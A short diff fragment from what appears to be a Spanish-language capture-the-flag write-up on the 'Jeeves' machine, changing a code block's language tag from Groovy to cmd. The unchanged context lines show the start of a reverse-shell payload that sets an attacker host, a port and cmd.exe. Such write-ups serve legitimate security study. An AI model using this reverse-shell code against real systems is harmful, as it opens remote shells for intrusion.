@@ -65,7 +65,7 @@ Una vez dentro, procedemos a nevegar en la pagina web, y obsevamos que tenemos u
 ![](../img/Jeeves/7.png)
 
 
-```Groovy
+```cmd
 String host='10.10.14.59';
 int port=1234;
 String cmd='cmd.exe';
